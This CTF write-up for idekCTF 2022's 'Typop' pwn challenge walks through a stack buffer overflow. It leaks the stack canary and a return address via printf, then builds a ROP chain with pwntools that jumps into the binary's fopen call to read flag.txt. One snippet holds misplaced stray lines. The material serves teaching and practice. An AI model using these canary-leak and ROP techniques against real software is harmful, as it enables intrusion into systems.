@@ -1,0 +1,119 @@
+#+title: idek2022: Typop
+#+AUTHOR: d0ntrash
+#+subtitle: emacs everywhere
+#+date: 2023-01-16
+#+tags[]: pwn, ctf
+* Pwn/Typop
+** Challenge Info
+   * Name: Typop
+   * Author: JW#9396
+   * Description: While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?
+   * Link to files: [[https://idekctf-challenges.storage.googleapis.com/uploads/14d19059835451f069fc575d8b2b9818a1fc2e5c254fc1c36218e6220d29bdb1/typop.tar][idek2022]]
+** Intro
+   :PROPERTIES:
+   :ID:       016f2d9c-2fde-478c-bb03-5f140e01edca
+   :END:
+   The challenge binary has only a few functions. In the ~main~ function not much happens besides ~getFeedback~ getting called in a ~while(true)~ loop:
+
+   [[file:/data/01/6f2d9c-2fde-478c-bb03-5f140e01edca/screenshot-20230116-135923.png]]
+
+   The interesting parts are in the ~getFeedback~ function:
+
+   [[file:/data/01/6f2d9c-2fde-478c-bb03-5f140e01edca/screenshot-20230116-140358.png]]
+
+   In both read functions there is a buffer overflow. However as we can see at the end of the function, the binary also uses stack canaries.
+   So we can't just overflow the buffer to overwrite the return address because the ~__stack_chk_fail()~ check would fail.
+
+*** Canary leak
+    :PROPERTIES:
+    :ID:       f1e4da43-eb15-4633-84cb-dac644906a77
+    :END:
+    To overflow the buffer without crashing the process we first need to leak the canary. Luckily, we can use the first
+    ~read()~ call followed by the ~printf()~ call to leak the canary, then write the correct canary back using the second ~read()~ call.
+
+    [[file:/data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-142422.png]]
+
+    In this case the canary is ~0x4f4bde881e0f0f00~ and comes directly after the input buffer. On Linux a stack canary always starts with a NULL byte.
+    Since ~printf()~ always prints up to the next NULL byte we simply have to overflow the buffer by one byte to overwrite the NULL byte to print the
+    stack canary followed by the ~rbp~ up to the next NULL byte.
+
+    The following code snippet does exactly that:
+    #+begin_src python
+    r.recvuntil(b"Do you want to complete a survey?")
+    r.sendline(b"y")
+    r.recvuntil("Do you like ctf?\n")
+    r.sendline(b'a'*offset_to_canary)
+    r.recvline() # recv input to new line
+    leak = r.recvline()
+    canary = int.from_bytes(b'\x00' + leak[:7], 'little')
+    rbp = int.from_bytes(leak[7:13], 'little')
+    print(f'rbp:          {hex(rbp)}')
+    print(f'canary:       {hex(canary)}')
+
+        r = process([exe.path])
+    return r
+    #+end_src
+
+    After the overflow the stack looks like this:
+
+    [[file:/data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-143231.png]]
+
+    Now that we know the canary, we can use the second ~read()~ call to write it back to the stack.
+
+    #+begin_src python
+    r.recvuntil(b'Aww :( Can you provide some extra feedback?')
+    r.sendline(b'a' * offset_to_canary + p64(canary))
+    #+end_src
+
+    When the ~getFeedback~ function gets called the second time we can use the information leak to leak the return address from
+    the stack which points to the main function. From this point, the offset to the base address
+    of the binary can be calculated which we can use to build our ROP chain.
+
+    #+begin_src python
+    r.recvuntil(b"Do you want to complete a survey?")
+    r.sendline(b"y")
+    r.recvuntil("Do you like ctf?\n")
+    # leak return address to main
+    r.sendline(b'a' * offset_to_ret)
+    r.recvline() # recv input to new line
+    ret_leak = int.from_bytes(r.recvline()[:6], 'little')
+    # set base address
+    exe.address = ret_leak - 0x1447
+    #+end_src
+
+    From here we could try to leak a libc address to ret2libc. In this case however, the binary contains a ~win~ function we can use
+    which reads a file and prints its content:
+
+    [[file:/data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-150202.png]]
+
+    Unfortunately, just overwriting the return address with the win address wont work since the ~win~ function takes 3 characters of the
+    filename as parameters. The parameters are passed via the registers ~rdi~, ~rsi~ and ~rdx~. The registers ~rsi~ and ~rdi~ can be set
+    by using simple ROP gadgets. For ~rdx~ however I did not find any useful gadgets.
+
+    So instead of calling the entry point of the ~win~ function we can also call it with an offset to the point where ~fopen~ gets called.
+    Therefore, we have to set the parameters for ~fopen~ befor jumping there. ~fopen~ takes a pointer to the filename and a pointer to a string containing
+    the mode. Since we only need 2 parameters which get passed via ~rdi~ and ~rsi~ we can achieve this using our already found gadgets:
+
+    #+begin_src python
+    fopen = p64(exe.address + 0x12ba)
+    pop_rdi = p64(exe.address + 0x14d3)
+    pop_rsi_r15 = p64(exe.address + 0x14d1)
+    read_mode_str = p64(exe.address + 0x2008)
+    r.sendline(b'a' * offset_to_canary + p64(canary)
+               # Overwrite rbp
+               # Set offset big enough so fgets does not fuck up the stack
+               + p64(rbp - 0x100)
+               # ROP Chain:
+               # pop pointer to 'flag.txt' string into rdi
+               + pop_rdi + p64(rbp+0x28)
+               # pop pointer to 'r' string into rsi
+               + pop_rsi_r15 + read_mode_str + p64(0xdeadbeef)
+               # return directly to fopen call in win function
+               + fopen
+               # filename string which will be used for fopen
+               + b'flag.txt\x00\x00')
+    #+end_src
+
+    This will read the flag from the ~flag.txt~ file and print it to stdout.
+
+    [[file:/data/f1/e4da43-eb15-4633-84cb-dac644906a77/screenshot-20230116-152138.png]]
